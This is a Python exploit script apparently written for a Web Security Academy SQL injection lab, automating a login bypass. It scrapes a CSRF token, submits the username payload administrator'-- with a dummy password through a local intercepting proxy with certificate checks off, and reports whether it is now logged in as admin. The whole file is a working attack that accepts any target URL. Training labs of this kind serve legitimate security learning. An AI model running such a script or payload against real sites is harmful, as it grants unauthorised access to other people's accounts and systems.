#!/usr/bin/env python3

"""
SYNOPSIS
========
Python script for Web-Security-Academy SQLi lab 02
::
  ./sqli-02.py "https://web-security-academy.net/login" "administrator'--"

DESCRIPTION
===========
SQLi exploit script used to bypass login.
"""
import argparse
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


def main():
    try:
        url: str = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <sql-payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "administrator--' % sys.argv[0])
        sys.exit(1)

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print("[+] Success! You are now logged in as admin.")
    else:
        print("[-] Denied!.")


if __name__ == "__main__":
    main()

